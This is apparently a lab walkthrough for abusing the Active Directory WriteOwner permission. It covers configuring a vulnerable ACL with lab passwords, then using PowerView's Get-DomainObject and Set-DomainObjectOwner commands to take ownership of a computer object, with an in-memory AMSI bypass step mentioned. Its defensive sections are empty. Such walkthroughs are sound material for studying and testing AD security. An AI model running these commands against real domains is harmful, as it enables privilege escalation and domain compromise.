# Write Owner

## Configuring

1. Login to `DC03` with the Administrator user and the password `Welcome01!`.
2. Open the "Active Directory Users and Computers" administration tool.

![](<../../../.gitbook/assets/image (67).png>)

3\. Click on "View" and enable "Advanced Features

![](<../../../.gitbook/assets/image (48).png>)

4\. Click on the "Computers" directory and right click on the "DATA01" computer and select "Properties". Then select "Security" to see the ACL's.

5\. Click on "Add" and type `sa_sql`.

![](<../../../.gitbook/assets/image (11).png>)

6\. Select the "sa\_sql" user and click "Advanced". Then select the "sa\_sql" once again and click on "Edit". Then select "Modify Owner".

![](<../../../.gitbook/assets/image (15).png>)

7\. We can quickly run BloodHound to check if the correct permissions are applied to the `sa_sql` user:

![](<../../../.gitbook/assets/image (1).png>)

![](<../../../.gitbook/assets/image (61).png>)

It is configured correctly!

## Attacking

### How it works

If a domain object has the WriteOwner ACL, the object can change the owner of the object. In this case the user `SA_SQL` can change the owner of the computerobject `DATA01`. Once you are "Owner" of a object, you can change the DACL of the object.

### Tools

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### Executing the attack

1. Download PowerView on the kali machine and host it on a webserver:

```
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
python3 -m http.server 8090
```

2\. Login to `WS01` as Richard with the password `Sample123`.

3\. Start PowerShell and download and execute an amsi and PowerView in memory:

![](<../../../.gitbook/assets/image (70).png>)

4\. In the page DACL-Abuses I showed you how to check for ACL's using BloodHound. We will abuse the "Write Owner" ACL `sa_sql` has on `DATA01`.

![](<../../../.gitbook/assets/image (53).png>)

5\. With PowerView we can query the current owner of the computerobject `DATA01`. Since we are queering data from another domain, we will have to provide a username and password for that domain. Create a credential object using the `get-credential` cmdlet:

```
$creds = Get-Credential
```

Then we can use PowerView to query the Domaincontroller from `secure.local` for the domain-object and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve aswell;

```
Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Credential $creds -Server 10.0.0.100 | select samaccountname, Owner
Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
```

![](<../../../.gitbook/assets/image (32).png>)

The current owner of the computerobject `DATA01` is the group `Domain Admins`.

6\. With PowerView we can change the owner of the object using the `Set-DomainObjectOwner` cmdlet.

```
Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100 -Identity DATA01 -OwnerIdentity sa_sql -Verbose
```

![](<../../../.gitbook/assets/image (69).png>)

7\. We didn't receive any errors, to lets use the same queries again to query the owner of the computerobject DATA01;

![](<../../../.gitbook/assets/image (21).png>)

8\. We successfully changed the owner of the computerobject from `Domain Admins` to `sa_ql`.

## Defending

### Recommendations



### Detection



## References

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

{% embed url="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner" %}
